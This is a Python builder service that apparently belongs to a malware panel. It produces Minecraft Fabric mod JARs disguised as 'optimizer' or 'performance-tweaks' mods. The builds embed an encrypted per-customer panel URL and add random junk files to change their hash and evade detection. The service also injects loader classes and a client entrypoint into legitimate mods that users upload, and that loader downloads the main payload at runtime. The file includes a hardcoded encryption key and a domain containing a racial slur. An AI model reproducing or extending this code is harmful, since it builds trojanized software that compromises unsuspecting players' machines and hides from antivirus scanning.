import os
import asyncio
import base64
import shutil
import uuid
import zipfile
import tempfile
import json
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from app.core.config import settings

class BuilderService:
    def __init__(self):
        self.build_lock = asyncio.Lock()
        self.project_dir = Path(settings.PROJECT_DIR)
        self.resource_file = self.project_dir / 'src' / 'main' / 'resources' / 'A.txt'
        self.build_script = self.project_dir / 'build_final.sh'
        
        # PRE-BUILT JAR - much faster than compiling each time
        self.prebuilt_jar = self.project_dir / 'prebuilt' / 'optimizer-template.jar'
        if not self.prebuilt_jar.exists():
            # Fallback for VPS deployment
            self.prebuilt_jar = self.project_dir / 'templates' / 'optimizer-FINAL.jar'
        
        # LOADER template - lightweight loader JAR with classes but no A.txt
        self.loader_classes_dir = self.project_dir.parent / 'loader' / 'build' / 'classes' / 'java' / 'main'
        self.prebuilt_loader = self.project_dir / 'prebuilt' / 'loader-template.jar'
        
        self.output_dir = self.project_dir / 'build' / 'output'
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def encrypt_webhook(self, webhook_url: str) -> str:
        iv = os.urandom(16)
        data = webhook_url.encode('utf-8')
        # PKCS7 Padding
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len]) * pad_len
        
        cipher = Cipher(algorithms.AES(settings.AES_KEY), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()
        return base64.b64encode(iv + encrypted).decode('utf-8')

    async def build_mod_fast(self, mod_name: str, user_id: int, build_key: str) -> str:
        """
        FAST BUILD: Uses pre-built JAR and only patches the config.
        Takes ~1 second instead of 2+ minutes.
        """
        async with self.build_lock:
            # Check if prebuilt exists
            if not self.prebuilt_jar.exists():
                # Fallback to full build if no prebuilt
                return await self._full_build(mod_name, user_id, build_key)
            
            # Construct Panel URL
            panel_url = f"https://niggaware.ru/api/data/{build_key}"
            encrypted_webhook = self.encrypt_webhook(panel_url)
            
            # Create unique output JAR
            unique_filename = f"build_{user_id}_{uuid.uuid4().hex[:8]}.jar"
            output_jar = self.output_dir / unique_filename
            
            try:
                # Copy template JAR and patch A.txt inside
                with tempfile.TemporaryDirectory() as tmpdir:
                    tmpdir = Path(tmpdir)
                    
                    # Extract prebuilt JAR
                    with zipfile.ZipFile(self.prebuilt_jar, 'r') as zf:
                        zf.extractall(tmpdir)
                    
                    # Patch A.txt with user's encrypted webhook
                    a_txt_path = tmpdir / 'A.txt'
                    with open(a_txt_path, 'w') as f:
                        f.write(encrypted_webhook)
                    
                    # POLYMORPHISM: Inject random junk files to change hash
                    for i in range(3):
                        junk_name = f"META-INF/junk_{uuid.uuid4().hex[:8]}.dat"
                        junk_path = tmpdir / junk_name
                        junk_path.parent.mkdir(parents=True, exist_ok=True)
                        with open(junk_path, 'wb') as f:
                            f.write(os.urandom(1024 + int(uuid.uuid4().int % 5000))) # Random size 1-6KB

                    # Optionally patch fabric.mod.json for custom mod name
                    fabric_json = tmpdir / 'fabric.mod.json'
                    if fabric_json.exists():
                        with open(fabric_json, 'r') as f:
                            mod_meta = json.load(f)
                        mod_meta['name'] = mod_name
                        # mod_meta['id'] remains 'optimizer'
                        with open(fabric_json, 'w') as f:
                            json.dump(mod_meta, f, indent=2)
                    
                    # Repack JAR
                    with zipfile.ZipFile(output_jar, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for file_path in tmpdir.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(tmpdir)
                                zf.write(file_path, arcname)
                
                return str(output_jar)
                
            except Exception as e:
                # Cleanup on error
                if output_jar.exists():
                    output_jar.unlink()
                raise Exception(f"Fast build failed: {str(e)}")

    async def inject_loader(self, jar_file, user_id: int, build_key: str) -> str:
        """
        Inject loader into an existing mod JAR.
        Adds loader classes, A.txt, and modifies manifest.
        """
        async with self.build_lock:
            # Construct Panel URL
            panel_url = f"https://niggaware.ru/api/data/{build_key}"
            encrypted_webhook = self.encrypt_webhook(panel_url)
            
            # Create unique output JAR
            unique_filename = f"inject_{user_id}_{uuid.uuid4().hex[:8]}.jar"
            output_jar = self.output_dir / unique_filename
            
            try:
                with tempfile.TemporaryDirectory() as tmpdir:
                    tmpdir = Path(tmpdir)
                    
                    # Save uploaded file
                    input_jar = tmpdir / 'input.jar'
                    content = await jar_file.read()
                    with open(input_jar, 'wb') as f:
                        f.write(content)
                    
                    # Extract the input JAR
                    extract_dir = tmpdir / 'extracted'
                    extract_dir.mkdir()
                    with zipfile.ZipFile(input_jar, 'r') as zf:
                        zf.extractall(extract_dir)
                    
                    # Add A.txt with encrypted build key
                    a_txt_path = extract_dir / 'A.txt'
                    with open(a_txt_path, 'w') as f:
                        f.write(encrypted_webhook)
                    
                    # Add loader marker file
                    marker_path = extract_dir / '.optimizer-loader'
                    with open(marker_path, 'w') as f:
                        f.write('1.0')
                    
                    # Add loader classes from prebuilt or compile inline
                    loader_classes = extract_dir / 'com' / 'example' / 'loader'
                    loader_classes.mkdir(parents=True, exist_ok=True)
                    
                    # If prebuilt loader exists, extract classes from it
                    if self.prebuilt_loader.exists():
                        with zipfile.ZipFile(self.prebuilt_loader, 'r') as lf:
                            for name in lf.namelist():
                                if name.startswith('com/example/loader/') and name.endswith('.class'):
                                    target = extract_dir / name
                                    target.parent.mkdir(parents=True, exist_ok=True)
                                    with open(target, 'wb') as f:
                                        f.write(lf.read(name))
                    
                    # Modify manifest to add loader marker
                    manifest_path = extract_dir / 'META-INF' / 'MANIFEST.MF'
                    if manifest_path.exists():
                        with open(manifest_path, 'r') as f:
                            manifest_content = f.read()
                        if 'Optimizer-Loader' not in manifest_content:
                            manifest_content = manifest_content.rstrip() + '\nOptimizer-Loader: true\nOptimizer-Loader-Version: 1.0\n'
                            with open(manifest_path, 'w') as f:
                                f.write(manifest_content)
                    else:
                        manifest_path.parent.mkdir(parents=True, exist_ok=True)
                        with open(manifest_path, 'w') as f:
                            f.write('Manifest-Version: 1.0\nOptimizer-Loader: true\nOptimizer-Loader-Version: 1.0\n')
                    
                    # Modify fabric.mod.json to add loader entrypoint
                    fabric_json = extract_dir / 'fabric.mod.json'
                    if fabric_json.exists():
                        with open(fabric_json, 'r') as f:
                            mod_meta = json.load(f)
                        
                        # Add loader entrypoint
                        if 'entrypoints' not in mod_meta:
                            mod_meta['entrypoints'] = {}
                        if 'client' not in mod_meta['entrypoints']:
                            mod_meta['entrypoints']['client'] = []
                        
                        loader_entry = 'com.example.loader.LoaderMod'
                        if loader_entry not in mod_meta['entrypoints']['client']:
                            mod_meta['entrypoints']['client'].insert(0, loader_entry)
                        
                        with open(fabric_json, 'w') as f:
                            json.dump(mod_meta, f, indent=2)
                    
                    # Repack JAR
                    with zipfile.ZipFile(output_jar, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for file_path in extract_dir.rglob('*'):
                            arcname = file_path.relative_to(extract_dir)
                            zf.write(file_path, arcname)
                
                return str(output_jar)
                
            except Exception as e:
                if output_jar.exists():
                    output_jar.unlink()
                raise Exception(f"Injection failed: {str(e)}")

    async def _full_build(self, mod_name: str, user_id: int, build_key: str) -> str:
        """
        FULL BUILD: Runs Gradle - slow but creates fresh JAR.
        Use this only once to create the template.
        """
        # Construct Panel URL
        panel_url = f"https://niggaware.ru/api/data/{build_key}"
        encrypted_webhook = self.encrypt_webhook(panel_url)
        
        # Write to resource file
        try:
            self.resource_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.resource_file, 'w') as f:
                f.write(encrypted_webhook)
        except Exception as e:
            raise Exception(f"Failed to write resource file: {str(e)}")

        try:
            # Run Build Script
            process = await asyncio.create_subprocess_exec(
                str(self.build_script),
                cwd=str(self.project_dir),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                error_msg = stderr.decode()
                raise Exception(f"Build failed: {error_msg}")

            # Find the built JAR
            final_jar = self.project_dir / 'optimizer-FINAL.jar'
            
            if not final_jar.exists():
                jars = list(self.project_dir.glob("optimizer-FINAL.jar"))
                if jars:
                    final_jar = jars[0]
                else:
                    raise Exception("Build successful but optimizer-FINAL.jar not found")
                
            # Move to unique path
            unique_filename = f"build_{user_id}_{uuid.uuid4().hex}.jar"
            unique_path = self.output_dir / unique_filename
            
            shutil.move(str(final_jar), str(unique_path))
            
            return str(unique_path)
        finally:
            # Cleanup resource file
            if self.resource_file.exists():
                self.resource_file.unlink()

    async def create_prebuilt_template(self) -> str:
        """
        Creates the prebuilt template JAR.
        Run this once manually after updating the mod code.
        """
        # Write placeholder
        with open(self.resource_file, 'w') as f:
            f.write("PLACEHOLDER_WEBHOOK_URL")
        
        try:
            process = await asyncio.create_subprocess_exec(
                str(self.build_script),
                cwd=str(self.project_dir),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                raise Exception(f"Template build failed: {stderr.decode()}")
            
            final_jar = self.project_dir / 'optimizer-FINAL.jar'
            if not final_jar.exists():
                raise Exception("Template JAR not found")
            
            # Save as template
            self.prebuilt_jar.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy(str(final_jar), str(self.prebuilt_jar))
            
            return f"Template created: {self.prebuilt_jar}"
        finally:
            if self.resource_file.exists():
                self.resource_file.unlink()

    async def build_loader(self, mod_name: str, user_id: int, build_key: str) -> str:
        """
        BUILD LOADER: Creates a lightweight loader mod (~7KB) that:
        - Uses prebuilt loader-template.jar
        - Patches A.txt with encrypted panel URL
        - Downloads the main mod from server at runtime
        """
        async with self.build_lock:
            # Construct Panel URL
            panel_url = f"https://niggaware.ru/api/data/{build_key}"
            
            # Create unique output JAR
            unique_filename = f"performance-tweaks_{uuid.uuid4().hex[:8]}.jar"
            output_jar = self.output_dir / unique_filename
            
            try:
                # Encrypt the panel URL for A.txt
                encrypted_a_txt = self._encrypt_a_txt(panel_url)
                
                with tempfile.TemporaryDirectory() as tmpdir:
                    tmpdir = Path(tmpdir)
                    
                    # Extract prebuilt loader template
                    loader_template = self.project_dir / 'prebuilt' / 'loader-template.jar'
                    if not loader_template.exists():
                        raise Exception("Loader template not found: " + str(loader_template))
                    
                    with zipfile.ZipFile(loader_template, 'r') as zf:
                        zf.extractall(tmpdir)
                    
                    # Patch A.txt with encrypted panel URL
                    a_txt_path = tmpdir / 'A.txt'
                    with open(a_txt_path, 'w') as f:
                        f.write(encrypted_a_txt)
                    
                    # Add some junk files for polymorphism
                    import random
                    import string
                    meta_inf = tmpdir / 'META-INF'
                    meta_inf.mkdir(exist_ok=True)
                    for i in range(3):
                        junk_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.dat'
                        junk_path = meta_inf / junk_name
                        junk_content = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(50, 200)))
                        with open(junk_path, 'w') as f:
                            f.write(junk_content)
                    
                    # Repack JAR with unique hash
                    with zipfile.ZipFile(output_jar, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for file_path in tmpdir.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(tmpdir)
                                zf.write(file_path, arcname)
                
                return str(output_jar)
                
            except Exception as e:
                if output_jar.exists():
                    output_jar.unlink()
                raise Exception(f"Loader build failed: {str(e)}")
    
    def _encrypt_a_txt(self, panel_url: str) -> str:
        """
        Encrypt panel URL for A.txt using AES-CBC.
        Format: Base64(IV + AES_CBC(panel_url))
        Key: d3x0n_0pt1m1z3r_k3y_2025_s3cr3!! (32 bytes)
        """
        import os
        from cryptography.hazmat.primitives import padding
        
        key = b'd3x0n_0pt1m1z3r_k3y_2025_s3cr3!!'
        iv = os.urandom(16)
        
        # Pad the plaintext to block size
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(panel_url.encode('utf-8')) + padder.finalize()
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Combine IV + ciphertext and base64 encode
        return base64.b64encode(iv + ciphertext).decode('utf-8')

    # Main build method - NOW BUILDS LOADER MOD (7KB)
    async def build_mod(self, mod_name: str, user_id: int, build_key: str) -> str:
        """
        Main entry point for building a mod for a user.
        NOW BUILDS LOADER MOD - downloads main mod at runtime
        """
        return await self.build_loader(mod_name, user_id, build_key)

builder_service = BuilderService()


